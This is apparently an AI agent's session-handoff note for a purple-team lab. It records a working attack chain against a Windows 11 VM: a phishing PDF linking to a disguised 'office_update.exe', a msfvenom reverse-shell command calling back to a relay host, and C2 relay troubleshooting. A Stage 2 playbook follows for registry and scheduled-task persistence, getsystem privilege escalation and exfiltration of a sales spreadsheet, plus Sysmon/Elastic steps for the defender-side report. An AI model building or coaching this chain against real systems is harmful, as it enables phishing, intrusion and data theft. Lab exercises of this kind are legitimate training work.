# STAGE 2 HANDOFF — Purple-Team Campaign Lab

> **Purpose:** handoff note for a FRESH Hermes session to continue Stage 2
> (persistence → privesc → exfil → incident report). Read this top-to-bottom first.
> The full chain is BUILT and a live meterpreter session is ESTABLISHED. Do NOT re-debug the C2 path.

## Current state (as of handoff)

- **Live meterpreter session: YES** (user confirmed it stays open — no more "Died").
- **Victim:** Windows 11 VM, `192.168.254.128` (VMware NAT, gw `.2`). Defender Real-Time = **OFF**, Memory Integrity = **OFF**.
- **Attack chain (all UP):**
  1. Payload source: `192.168.254.100:8080` (relay's HTTP) → serves `office_update.exe` (256,000 B, PE32+)
  2. Beacon target: `192.168.254.100:4443` (relay's relay)
  3. Relay → `127.0.0.1:4445` (Kali msfconsole handler)
- **Kali:** WSL distro `kali-linux` (running). `http.server` on `127.0.0.1:8090` serves `/tmp`. msfconsole handler `exploit/multi/handler` on `127.0.0.1:4445`.
- **Phish PDF:** `Year-End_Showcase_Invitation_v2.pdf` — RSVP link = `http://192.168.254.100:8080/office_update.exe`

## FIRST thing to do in the new session (confirm, don't assume)

```
# In Kali msfconsole:
sessions -l
sessions -i <ID>
sysinfo
getuid
```
- `sysinfo` → OS/Arch. `getuid` → **which user** (determines if we need `getsystem` before persistence).
- If the session is GONE (laptop slept, msfconsole restarted, VM rebooted): re-establish by
  (a) confirm relay up: `for p in 8080 4443; do ...` on `192.168.254.100`,
  (b) confirm Kali handler: `127.0.0.1:4445` open,
  (c) worker re-runs `office_update.exe` on the VM.
  The relay + payload are persistent; only the msfconsole handler dies if that terminal closes.

## Stage 2 playbook (the user's campaign, from Campaign_Lab_Full_Guide.pdf)

Work ONLY in the established meterpreter session (`sessions -i <ID>`):
1. **Persistence** (survives reboot):
   - Run key: `C:\ProgramData` copy + `HKLM\...\Run` (needs admin → do after `getsystem`)
   - Scheduled task via `schtasks` or `task`
   - Drop beacon to `C:\ProgramData\`
2. **Priv-esc:** `getsystem` (if not already SYSTEM). Confirm with `getuid` → `NT AUTHORITY\SYSTEM`.
3. **Exfil:** `download C:\...\Q3_sales.xlsx` (or whatever the target file is) to Kali.
4. **Defender side (for the incident report):** the victim has **Sysmon + Elastic** streaming. Pull the evidence:
   - ES API: `https://siem.example.com:9200`, API key in `<your ES credentials file>`
   - Readable: `logs-*` / `.ds-logs-*` (raw), `.internal.alerts-security.*` (alerts). ES 9.4.5, FLAT dotted fields.
   - Sysmon **EID 5** = process termination, **EID 1** = process creation, **EID 3** = network, **EID 11** = file write.
   - Note: only Windows telemetry is in the readable indexes here.

## CRITICAL gotchas (learned the hard way — do NOT repeat)

| Symptom | Real cause | Fix |
|---|---|---|
| `PermissionError: WinError 10013` binding `:443` | **Hyper-V blocks port 443** on this host | Use **4443** for the relay |
| Stale relay on `:80`, unkillable (PID 18988, "Access denied") | first relay got elevated & squatting | Serve payload on **8080**, ignore `:80` |
| Session opens then **`Reason: Died`**, every time, process still alive, NO AV event | **relay's 10s socket timeout fired mid-handshake**, killing the bridge | `c2_relay.py` **must** `client.settimeout(None); up.settimeout(None)` right after `create_connection` — already in the file |
| "This app can't run on your PC" | msfvenom `-f raw` (no PE header) | Use **`-f exe`** |
| Browser opens a tab instead of downloading | server send-timeout while user sits on Keep/Discard dialog | relay HTTP now does `c.settimeout(None)` before `sendall` — already fixed |
| WSL msf can't bind `192.168.254.100` | mirrored WSL2 doesn't route inbound to host's VMware IP | the **relay (native Windows process)** is REQUIRED in the path; keep it |
| Relay serves wrong/stale payload size | payload is cached in memory at relay startup | **restart the relay** whenever the payload file changes |

## Regenerate payload (only if needed)
```
wsl -d kali-linux -- msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=192.168.254.100 LPORT=4443 -f exe -o /tmp/office_update.exe
# then RESTART the relay (it re-fetches from 127.0.0.1:8090 at boot)
```

## Restart the relay (if it died)
```
cd /c/Users/style/lab && python "C:\Users\style\lab\c2_relay.py"   # background/tracked
```
Ports it must own: `:8080` (HTTP) + `:4443` (relay). `127.0.0.1:4445` is Kali's msf handler, not the relay.

## Key files (all in C:\Users\style\lab\)
- `c2_relay.py` — the C2 bridge (HTTP + relay), has the timeout fix
- `Year-End_Showcase_Invitation_v2.pdf` — the phish (current, correct link)
- `lab-architecture.md` / `.png` / `.pdf` — supervisor diagram (ASCII-diagram .md is the readable one)
- `C:\Users\style\Downloads\Campaign_Lab_Full_Guide.pdf` — the campaign guide (source of truth for stages)
- ES creds: `<your ES credentials file>`

## Dry-run / coach mode reminder
User runs all hands-on steps himself (VM actions, msfconsole, clicks). I EXPLAIN + show commands + verify state; I do NOT execute attack payloads for him. He prefers copy-pasteable command blocks and Malay/English codeswitching.
